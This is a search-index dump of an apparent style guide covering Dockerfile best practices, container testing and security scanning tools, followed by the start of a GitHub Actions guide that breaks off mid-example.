PATH=\"/app/node_modules/.bin:${PATH}\"\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#expose-instruction","title":"EXPOSE Instruction","text":"<pre><code>## Document exposed ports\nEXPOSE 3000\nEXPOSE 8080/tcp\nEXPOSE 8081/udp\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#user-instruction","title":"USER Instruction","text":"","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#always-run-as-non-root-user","title":"Always Run as Non-Root User","text":"<pre><code>## Good - Create and use non-root user\nRUN addgroup -g 1001 -S nodejs &amp;&amp; \\\n    adduser -S nodejs -u 1001\n\nUSER nodejs\n\n## Bad - Running as root (default)\n## (no USER instruction)\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#multi-stage-build-examples","title":"Multi-Stage Build Examples","text":"","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#nodejs-application","title":"Node.js Application","text":"<pre><code>## syntax=docker/dockerfile:1\n\n## Build stage\nFROM node:18-alpine AS builder\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci\nCOPY . .\nRUN npm run build &amp;&amp; \\\n    npm prune --production\n\n## Production stage\nFROM node:18-alpine AS production\nWORKDIR /app\n\n## Create non-root user\nRUN addgroup -g 1001 -S nodejs &amp;&amp; \\\n    adduser -S nodejs -u 1001\n\n## Copy files with correct ownership\nCOPY --from=builder --chown=nodejs:nodejs /app/dist ./dist\nCOPY --from=builder --chown=nodejs:nodejs /app/node_modules ./node_modules\nCOPY --chown=nodejs:nodejs package.json ./\n\nUSER nodejs\n\nEXPOSE 3000\n\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n  CMD node healthcheck.js\n\nCMD [\"node\", \"dist/index.js\"]\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#python-application","title":"Python Application","text":"<pre><code>## syntax=docker/dockerfile:1\n\n## Build stage\nFROM python:3.11-slim AS builder\nWORKDIR /app\n\n## Install build dependencies\nRUN apt-get update &amp;&amp; \\\n    apt-get install -y --no-install-recommends \\\n      build-essential \\\n      libpq-dev &amp;&amp; \\\n    rm -rf /var/lib/apt/lists/*\n\n## Install Python dependencies\nCOPY requirements.txt .\nRUN pip install --user --no-cache-dir -r requirements.txt\n\n## Production stage\nFROM python:3.11-slim AS production\nWORKDIR /app\n\n## Install runtime dependencies\nRUN apt-get update &amp;&amp; \\\n    apt-get install -y --no-install-recommends \\\n      libpq5 &amp;&amp; \\\n    rm -rf /var/lib/apt/lists/*\n\n## Create non-root user\nRUN useradd -m -u 1001 appuser\n\n## Copy Python packages from builder\nCOPY --from=builder /root/.local /home/appuser/.local\n\n## Copy application code\nCOPY --chown=appuser:appuser . .\n\nUSER appuser\n\nENV PATH=\"/home/appuser/.local/bin:${PATH}\" \\\n    PYTHONUNBUFFERED=1\n\nEXPOSE 8000\n\nHEALTHCHECK --interval=30s --timeout=3s \\\n  CMD python healthcheck.py\n\nCMD [\"python\", \"-m\", \"uvicorn\", \"main:app\", \"--host\", \"0.0.0.0\", \"--port\", \"8000\"]\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#go-application","title":"Go Application","text":"<pre><code>## syntax=docker/dockerfile:1\n\n## Build stage\nFROM golang:1.21-alpine AS builder\nWORKDIR /app\n\n## Install build dependencies\nRUN apk add --no-cache git\n\n## Copy go mod files\nCOPY go.mod go.sum ./\nRUN go mod download\n\n## Copy source code\nCOPY . .\n\n## Build binary\nRUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o main .\n\n## Production stage\nFROM alpine:3.19 AS production\nWORKDIR /app\n\n## Install ca-certificates for HTTPS\nRUN apk --no-cache add ca-certificates\n\n## Create non-root user\nRUN addgroup -g 1001 -S appuser &amp;&amp; \\\n    adduser -S appuser -u 1001 -G appuser\n\n## Copy binary from builder\nCOPY --from=builder --chown=appuser:appuser /app/main .\n\nUSER appuser\n\nEXPOSE 8080\n\nHEALTHCHECK --interval=30s --timeout=3s \\\n  CMD wget --no-verbose --tries=1 --spider http://localhost:8080/health || exit 1\n\nCMD [\"./main\"]\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#dockerignore","title":".dockerignore","text":"<p>Always create a <code>.dockerignore</code> file:</p> <pre><code>## Git\n.git\n.gitignore\n\n## Node.js\nnode_modules\nnpm-debug.log\n\n## Python\n__pycache__\n*.py[cod]\n*$py.class\n.Python\nvenv/\n.env\n\n## Build artifacts\ndist\nbuild\n*.o\n*.so\n\n## IDE\n.vscode\n.idea\n*.swp\n*.swo\n\n## Documentation\n*.md\ndocs/\n\n## Tests\ntests/\n*.test.js\n\n## CI/CD\n.github\n.gitlab-ci.yml\nJenkinsfile\n\n## Docker\nDockerfile*\ndocker-compose*.yml\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#testing","title":"Testing","text":"","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#testing-with-container-structure-test","title":"Testing with Container Structure Test","text":"<p>Use Container Structure Test to validate Docker images:</p> <pre><code>## Install Container Structure Test\ncurl -LO https://storage.googleapis.com/container-structure-test/latest/container-structure-test-linux-amd64\nchmod +x container-structure-test-linux-amd64\nsudo mv container-structure-test-linux-amd64 /usr/local/bin/container-structure-test\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#test-configuration","title":"Test Configuration","text":"<p>Create <code>container-structure-test.yaml</code>:</p> <pre><code>schemaVersion: 2.0.0\n\n## Command tests - verify installed packages\ncommandTests:\n  - name: \"node version\"\n    command: \"node\"\n    args: [\"--version\"]\n    expectedOutput: [\"v18.*\"]\n\n  - name: \"npm is installed\"\n    command: \"which\"\n    args: [\"npm\"]\n    exitCode: 0\n\n  - name: \"application exists\"\n    command: \"test\"\n    args: [\"-f\", \"/app/dist/index.js\"]\n    exitCode: 0\n\n## File existence tests\nfileExistenceTests:\n  - name: \"application directory\"\n    path: \"/app\"\n    shouldExist: true\n    permissions: \"drwxr-xr-x\"\n\n  - name: \"package.json exists\"\n    path: \"/app/package.json\"\n    shouldExist: true\n\n  - name: \"no secrets in image\"\n    path: \"/app/.env\"\n    shouldExist: false\n\n## File content tests\nfileContentTests:\n  - name: \"package.json has correct version\"\n    path: \"/app/package.json\"\n    expectedContents: ['\"version\": \"1.0.0\"']\n\n## Metadata tests\nmetadataTest:\n  env:\n    - key: \"NODE_ENV\"\n      value: \"production\"\n    - key: \"PORT\"\n      value: \"3000\"\n\n  exposedPorts: [\"3000\"]\n\n  workdir: \"/app\"\n\n  ## Verify non-root user\n  user: \"nodejs\"\n\n  labels:\n    - key: \"org.opencontainers.image.title\"\n      value: \"My Application\"\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#running-structure-tests","title":"Running Structure Tests","text":"<pre><code>## Test a locally built image\ncontainer-structure-test test \\\n  --image myapp:latest \\\n  --config container-structure-test.yaml\n\n## Test with verbose output\ncontainer-structure-test test \\\n  --image myapp:latest \\\n  --config container-structure-test.yaml \\\n  --verbosity debug\n\n## Test multiple config files\ncontainer-structure-test test \\\n  --image myapp:latest \\\n  --config test-base.yaml \\\n  --config test-security.yaml\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#testing-with-trivy","title":"Testing with Trivy","text":"<p>Test for vulnerabilities and misconfigurations:</p> <pre><code>## Scan for vulnerabilities\ntrivy image myapp:latest\n\n## Scan with specific severity\ntrivy image --severity HIGH,CRITICAL myapp:latest\n\n## Scan Dockerfile for misconfigurations\ntrivy config Dockerfile\n\n## Generate JSON report\ntrivy image --format json --output results.json myapp:latest\n\n## Fail build on high/critical vulnerabilities\ntrivy image --exit-code 1 --severity HIGH,CRITICAL myapp:latest\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#testing-with-hadolint","title":"Testing with hadolint","text":"<p>Lint Dockerfiles for best practices:</p> <pre><code>## Basic linting\nhadolint Dockerfile\n\n## Lint with specific format\nhadolint --format json Dockerfile\n\n## Lint in CI/CD\nhadolint Dockerfile || exit 1\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#integration-testing-with-docker-compose","title":"Integration Testing with Docker Compose","text":"<p>Test multi-container applications:</p> <pre><code>## docker-compose.test.yml\nversion: '3.8'\n\nservices:\n  app:\n    build:\n      context: .\n      target: production\n    environment:\n      - NODE_ENV=test\n      - DATABASE_URL=postgresql://test:test@db:5432/test\n    depends_on:\n      db:\n        condition: service_healthy\n\n  db:\n    image: postgres:15-alpine\n    environment:\n      POSTGRES_USER: test\n      POSTGRES_PASSWORD: test\n      POSTGRES_DB: test\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U test\"]\n      interval: 5s\n      timeout: 3s\n      retries: 5\n\n  test:\n    build:\n      context: .\n      target: builder\n    command: npm test\n    environment:\n      - DATABASE_URL=postgresql://test:test@db:5432/test\n    depends_on:\n      db:\n        condition: service_healthy\n</code></pre> <p>Run integration tests:</p> <pre><code>## Run tests with docker-compose\ndocker-compose -f docker-compose.test.yml up --abort-on-container-exit\n\n## Clean up after tests\ndocker-compose -f docker-compose.test.yml down -v\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#runtime-testing-with-bats","title":"Runtime Testing with BATS","text":"<p>Test container behavior at runtime:</p> <pre><code>## tests/docker-runtime.bats\n#!/usr/bin/env bats\n\nsetup() {\n  # Start container for testing\n  docker run -d --name test-app -p 3000:3000 myapp:latest\n  sleep 5  # Wait for startup\n}\n\nteardown() {\n  # Clean up\n  docker stop test-app\n  docker rm test-app\n}\n\n@test \"container starts successfully\" {\n  run docker ps --filter \"name=test-app\" --format \"{{.Status}}\"\n  [[ \"$output\" =~ \"Up\" ]]\n}\n\n@test \"application responds to HTTP requests\" {\n  run curl -s -o /dev/null -w \"%{http_code}\" http://localhost:3000/health\n  [ \"$output\" = \"200\" ]\n}\n\n@test \"container runs as non-root user\" {\n  run docker exec test-app whoami\n  [ \"$output\" = \"nodejs\" ]\n}\n\n@test \"container has minimal attack surface\" {\n  # Verify no shell in distroless images\n  run docker exec test-app sh -c \"exit 0\"\n  [ \"$status\" -ne 0 ]\n}\n\n@test \"application logs are accessible\" {\n  run docker logs test-app\n  [[ \"$output\" =~ \"Server started on port 3000\" ]]\n}\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#cicd-integration","title":"CI/CD Integration","text":"<pre><code>## .github/workflows/docker-test.yml\nname: Docker Build and Test\n\non: [push, pull_request]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Lint Dockerfile\n        uses: hadolint/hadolint-action@v3.1.0\n        with:\n          dockerfile: Dockerfile\n\n      - name: Build image\n        run: docker build -t myapp:test .\n\n      - name: Run Trivy vulnerability scan\n        uses: aquasecurity/trivy-action@master\n        with:\n          image-ref: myapp:test\n          format: sarif\n          output: trivy-results.sarif\n\n      - name: Install Container Structure Test\n        run: |\n          curl -LO https://storage.googleapis.com/container-structure-test/latest/container-structure-test-linux-amd64\n          chmod +x container-structure-test-linux-amd64\n          sudo mv container-structure-test-linux-amd64 /usr/local/bin/container-structure-test\n\n      - name: Run structure tests\n        run: |\n          container-structure-test test \\\n            --image myapp:test \\\n            --config container-structure-test.yaml\n\n      - name: Test image size\n        run: |\n          size=$(docker image inspect myapp:test --format='{{.Size}}')\n          max_size=$((500 * 1024 * 1024))  # 500MB\n          if [ \"$size\" -gt \"$max_size\" ]; then\n            echo \"Image too large: $(($size / 1024 / 1024))MB\"\n            exit 1\n          fi\n\n      - name: Test container startup\n        run: |\n          docker run -d --name test-container -p 3000:3000 myapp:test\n          sleep 5\n          curl -f http://localhost:3000/health || exit 1\n          docker stop test-container\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#security-testing","title":"Security Testing","text":"<p>Test for security best practices:</p> <pre><code>## tests/security-tests.yaml\nschemaVersion: 2.0.0\n\ncommandTests:\n  - name: \"runs as non-root\"\n    command: \"whoami\"\n    expectedOutput: [\"nodejs|appuser|node\"]\n    excludedOutput: [\"root\"]\n\n  - name: \"no write permissions on system directories\"\n    command: \"test\"\n    args: [\"-w\", \"/usr\"]\n    exitCode: 1\n\n  - name: \"no unnecessary tools installed\"\n    command: \"which\"\n    args: [\"wget\"]\n    exitCode: 1\n\nfileExistenceTests:\n  - name: \"no .git directory\"\n    path: \"/app/.git\"\n    shouldExist: false\n\n  - name: \"no environment files\"\n    path: \"/app/.env\"\n    shouldExist: false\n\n  - name: \"no node_modules in final image\"\n    path: \"/app/node_modules\"\n    shouldExist: false  # For compiled apps\n\nmetadataTest:\n  ## Ensure running as non-root\n  user: \"nodejs\"\n\n  ## No hardcoded secrets in env\n  envVars:\n    - key: \"API_KEY\"\n      isSet: false\n    - key: \"DB_PASSWORD\"\n      isSet: false\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#image-layer-analysis","title":"Image Layer Analysis","text":"<p>Use Dive to analyze image layers:</p> <pre><code>## Install dive\nwget https://github.com/wagoodman/dive/releases/download/v0.11.0/dive_0.11.0_linux_amd64.deb\nsudo apt install ./dive_0.11.0_linux_amd64.deb\n\n## Analyze image layers\ndive myapp:latest\n\n## CI mode with efficiency threshold\ndive myapp:latest --ci --lowestEfficiency=0.95\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#performance-testing","title":"Performance Testing","text":"<p>Test build and runtime performance:</p> <pre><code>## tests/performance.sh\n#!/bin/bash\n\n## Build time test\nstart_time=$(date +%s)\ndocker build -t myapp:test .\nend_time=$(date +%s)\nbuild_time=$((end_time - start_time))\n\necho \"Build time: ${build_time}s\"\nif [ \"$build_time\" -gt 300 ]; then\n  echo \"Build taking too long (&gt;5 minutes)\"\n  exit 1\nfi\n\n## Image size test\nsize=$(docker image inspect myapp:test --format='{{.Size}}' | numfmt --to=iec)\necho \"Image size: $size\"\n\n## Startup time test\nstart_time=$(date +%s)\ndocker run -d --name perf-test myapp:test\nwhile ! docker exec perf-test curl -s http://localhost:3000/health &gt; /dev/null 2&gt;&amp;1; do\n  sleep 1\ndone\nend_time=$(date +%s)\nstartup_time=$((end_time - start_time))\n\necho \"Startup time: ${startup_time}s\"\n\ndocker stop perf-test\ndocker rm perf-test\n\nif [ \"$startup_time\" -gt 30 ]; then\n  echo \"Startup too slow (&gt;30 seconds)\"\n  exit 1\nfi\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#security-best-practices","title":"Security Best Practices","text":"","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#scan-for-vulnerabilities","title":"Scan for Vulnerabilities","text":"<pre><code>## Scan image with Trivy\ntrivy image myapp:latest\n\n## Scan image with Grype\ngrype myapp:latest\n\n## Scan with Docker Scout\ndocker scout cves myapp:latest\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#use-minimal-base-images","title":"Use Minimal Base Images","text":"<pre><code>## Good - Minimal alpine image\nFROM node:18-alpine\n\n## Good - Distroless image (even smaller, no shell)\nFROM gcr.io/distroless/nodejs18-debian11\n\n## Avoid - Full Debian/Ubuntu images\nFROM node:18\nFROM ubuntu:22.04\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#dont-store-secrets-in-images","title":"Don't Store Secrets in Images","text":"<pre><code>## Bad - Secret in ENV\nENV DB_PASSWORD=supersecret\n\n## Bad - Secret in file\nCOPY .env .\n\n## Good - Use runtime secrets\n## Pass via environment variables at runtime\n## docker run -e DB_PASSWORD=$DB_PASSWORD myapp\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#healthcheck","title":"HEALTHCHECK","text":"<pre><code>## HTTP health check\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n  CMD curl -f http://localhost:3000/health || exit 1\n\n## TCP health check\nHEALTHCHECK --interval=30s --timeout=3s \\\n  CMD nc -z localhost 3000 || exit 1\n\n## Custom script\nHEALTHCHECK --interval=30s --timeout=3s \\\n  CMD node healthcheck.js\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#labels","title":"Labels","text":"<pre><code>LABEL org.opencontainers.image.title=\"My Application\" \\\n      org.opencontainers.image.description=\"A sample application\" \\\n      org.opencontainers.image.version=\"1.0.0\" \\\n      org.opencontainers.image.authors=\"Tyler Dukes &lt;tyler@example.com&gt;\" \\\n      org.opencontainers.image.url=\"https://example.com\" \\\n      org.opencontainers.image.source=\"https://github.com/myorg/myapp\" \\\n      org.opencontainers.image.licenses=\"MIT\"\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#anti-patterns","title":"Anti-Patterns","text":"","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#avoid-running-as-root","title":"\u274c Avoid: Running as Root","text":"<pre><code>## Bad - Running as root\nFROM node:18-alpine\nCOPY . /app\nCMD [\"node\", \"index.js\"]\n\n## Good - Non-root user\nFROM node:18-alpine\nRUN adduser -D appuser\nUSER appuser\nCOPY . /app\nCMD [\"node\", \"index.js\"]\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#avoid-using-latest-tag","title":"\u274c Avoid: Using latest Tag","text":"<pre><code>## Bad - Unpredictable builds\nFROM node:latest\n\n## Good - Pinned version\nFROM node:18.19-alpine3.19\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#avoid-installing-unnecessary-packages","title":"\u274c Avoid: Installing Unnecessary Packages","text":"<pre><code>## Bad - Installing unnecessary packages\nRUN apt-get update &amp;&amp; apt-get install -y \\\n    build-essential \\\n    python3 \\\n    curl \\\n    vim \\\n    nano\n\n## Good - Only install what's needed\nRUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\\n    build-essential &amp;&amp; \\\n    rm -rf /var/lib/apt/lists/*\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#avoid-multiple-run-commands-for-package-install","title":"\u274c Avoid: Multiple RUN Commands for Package Install","text":"<pre><code>## Bad - Creates multiple layers\nRUN apt-get update\nRUN apt-get install -y curl\nRUN apt-get install -y git\nRUN apt-get clean\n\n## Good - Single layer with cleanup\nRUN apt-get update &amp;&amp; \\\n    apt-get install -y --no-install-recommends \\\n        curl \\\n        git &amp;&amp; \\\n    apt-get clean &amp;&amp; \\\n    rm -rf /var/lib/apt/lists/*\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#avoid-copying-entire-context","title":"\u274c Avoid: Copying Entire Context","text":"<pre><code>## Bad - Copies everything including .git, node_modules, etc.\nFROM node:18-alpine\nCOPY . /app\n\n## Good - Use .dockerignore and copy selectively\n## .dockerignore:\n## node_modules\n## .git\n## .env\n## *.md\n\nFROM node:18-alpine\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --only=production\nCOPY src/ ./src/\nCOPY public/ ./public/\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#avoid-not-using-multi-stage-builds","title":"\u274c Avoid: Not Using Multi-Stage Builds","text":"<pre><code>## Bad - Build tools remain in final image\nFROM node:18\nWORKDIR /app\nCOPY package*.json ./\nRUN npm install  # Includes dev dependencies\nCOPY . .\nRUN npm run build\nCMD [\"npm\", \"start\"]\n\n## Good - Multi-stage build\nFROM node:18 AS builder\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci\nCOPY . .\nRUN npm run build\n\nFROM node:18-alpine\nWORKDIR /app\nCOPY --from=builder /app/dist ./dist\nCOPY --from=builder /app/package*.json ./\nRUN npm ci --only=production\nUSER node\nCMD [\"node\", \"dist/index.js\"]\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#avoid-exposing-secrets-in-build","title":"\u274c Avoid: Exposing Secrets in Build","text":"<pre><code>## Bad - Secrets in image layers\nFROM node:18-alpine\nWORKDIR /app\nCOPY .env .env  # \u274c Secret file in image!\nRUN echo \"API_KEY=secret123\" &gt; config.txt  # \u274c In layer history!\n\n## Good - Use build secrets (Docker BuildKit)\n## syntax=docker/dockerfile:1\nFROM node:18-alpine\nWORKDIR /app\nRUN --mount=type=secret,id=npmrc,target=/root/.npmrc \\\n    npm install private-package\n\n## Or use build args (for non-sensitive config)\nARG NODE_ENV=production\nENV NODE_ENV=$NODE_ENV\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#building-and-tagging","title":"Building and Tagging","text":"<pre><code>## Build with tag\ndocker build -t myapp:1.0.0 .\n\n## Build with multiple tags\ndocker build -t myapp:1.0.0 -t myapp:latest .\n\n## Build with build args\ndocker build --build-arg NODE_ENV=production -t myapp:1.0.0 .\n\n## Build with target stage\ndocker build --target production -t myapp:1.0.0 .\n\n## Build with platform\ndocker buildx build --platform linux/amd64,linux/arm64 -t myapp:1.0.0 .\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#tool-configurations","title":"Tool Configurations","text":"","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#hadolint-configuration","title":"hadolint Configuration","text":"<p><code>.hadolint.yaml</code>:</p> <pre><code>ignored:\n  - DL3008  # Pin versions in apt-get install\n  - DL3013  # Pin versions in pip\n\ntrustedRegistries:\n  - docker.io\n  - gcr.io\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#running-hadolint","title":"Running hadolint","text":"<pre><code>## Lint Dockerfile\nhadolint Dockerfile\n\n## Lint with custom config\nhadolint --config .hadolint.yaml Dockerfile\n\n## Output as JSON\nhadolint --format json Dockerfile\n</code></pre>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#references","title":"References","text":"","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#official-documentation","title":"Official Documentation","text":"<ul> <li>Dockerfile Reference</li> <li>Best Practices</li> <li>Multi-Stage Builds</li> </ul>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#security","title":"Security","text":"<ul> <li>Docker Security Best Practices</li> <li>CIS Docker Benchmark</li> </ul>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/dockerfile/#tools","title":"Tools","text":"<ul> <li>hadolint - Dockerfile linter</li> <li>Trivy - Vulnerability scanner</li> <li>Dive - Image layer analyzer</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["docker","dockerfile","containers","devops","security"]},{"location":"02_language_guides/github_actions/","title":"GitHub Actions Style Guide","text":"","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#language-overview","title":"Language Overview","text":"<p>GitHub Actions is a CI/CD platform that allows you to automate build, test, and deployment workflows directly in your GitHub repository. This guide covers GitHub Actions best practices for creating maintainable, efficient, and secure workflows.</p>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>File Location: <code>.github/workflows/*.yml</code> or <code>.github/workflows/*.yaml</code></li> <li>File Format: YAML</li> <li>Primary Use: CI/CD pipelines, automation, repository management</li> <li>Key Concepts: Workflows, jobs, steps, actions, runners</li> </ul>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes File Naming Workflows <code>kebab-case.yml</code> <code>ci.yml</code>, <code>deploy-prod.yml</code> Descriptive workflow names Location <code>.github/workflows/</code> Required directory Workflow files location Workflow Structure <code>name</code> Workflow name <code>name: CI Pipeline</code> Descriptive workflow name <code>on</code> Trigger events <code>on: [push, pull_request]</code> When workflow runs <code>jobs</code> Job definitions <code>jobs:</code> Container for jobs <code>runs-on</code> Runner OS <code>runs-on: ubuntu-latest</code> Execution environment <code>steps</code> Job steps <code>steps:</code> Sequential actions Triggers Push <code>on: push</code> Branch pushes Code push events Pull Request <code>on: pull_request</code> PR events PR open/update Schedule <code>on: schedule</code> <code>cron: '0 0 * * *'</code> Scheduled runs Workflow Dispatch <code>on: workflow_dispatch</code> Manual triggers Manual workflow run Steps Checkout <code>actions/checkout@v4</code> Clone repository Get code Run Command <code>run: npm install</code> Execute shell command Run scripts Use Action <code>uses: actions/setup-node@v4</code> Use marketplace action Reusable actions Set Environment <code>env:</code> <code>NODE_ENV: production</code> Environment variables Secrets Access Secrets <code>${{ secrets.SECRET_NAME }}</code> <code>${{ secrets.API_KEY }}</code> Secure credentials Environment <code>environment: production</code> Deployment environment Environment protection Best Practices Pin Versions Use specific versions <code>actions/checkout@v4</code> Not <code>@main</code> or <code>@master</code> Matrix Builds Test multiple versions <code>strategy: matrix:</code> Test compatibility Caching Cache dependencies <code>actions/cache@v4</code> Speed up workflows Concurrency Control concurrent runs <code>concurrency:</code> Prevent conflicts","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#basic-workflow-structure","title":"Basic Workflow Structure","text":"","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#simple-ci-workflow","title":"Simple CI Workflow","text":"<pre><code>name: CI\n\non:\n  push:\n    branches: [main, develop]\n  pull_request:\n    branches: [main]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '18'\n          cache: 'npm'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Run tests\n        run: npm test\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#workflow-triggers","title":"Workflow Triggers","text":"","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#push-events","title":"Push Events","text":"<pre><code>on:\n  push:\n    branches:\n      - main\n      - develop\n      - 'release/**'\n    paths:\n      - 'src/**'\n      - 'package.json'\n    tags:\n      - 'v*'\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#pull-request-events","title":"Pull Request Events","text":"<pre><code>on:\n  pull_request:\n    branches: [main]\n    types: [opened, synchronize, reopened]\n    paths-ignore:\n      - '**.md'\n      - 'docs/**'\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#schedule-cron","title":"Schedule (Cron)","text":"<pre><code>on:\n  schedule:\n    # Run at 2 AM UTC every day\n    - cron: '0 2 * * *'\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#manual-trigger","title":"Manual Trigger","text":"<pre><code>on:\n  workflow_dispatch:\n    inputs:\n      environment:\n        description: 'Environment to deploy to'\n        required: true\n        type: choice\n        options:\n          - development\n          - staging\n          - production\n      debug_enabled:\n        description: 'Enable debug logging'\n        required: false\n        type: boolean\n        default: false\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#multiple-triggers","title":"Multiple Triggers","text":"<pre><code>on:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n  workflow_dispatch:\n  schedule:\n    - cron: '0 0 * * 0'  # Weekly on Sunday\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#jobs-and-steps","title":"Jobs and Steps","text":"","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#sequential-jobs","title":"Sequential Jobs","text":"<pre><code>jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci\n      - run: npm run build\n\n  test:\n    runs-on: ubuntu-latest\n    needs: build\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci\n      - run: npm test\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: [build, test]\n    if: github.ref == 'refs/heads/main'\n    steps:\n      - run: echo \"Deploying to production\"\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#parallel-jobs","title":"Parallel Jobs","text":"<pre><code>jobs:\n  test-node:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm test\n\n  test-python:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: pytest\n\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm run lint\n</code></pre>","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#matrix-strategy","title":"Matrix Strategy","text":"","tags":["github-actions","cicd","automation","workflows","devops"]},{"location":"02_language_guides/github_actions/#basic-matrix","title":"Basic Matrix","text":"<pre><code>jobs:\n  test:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      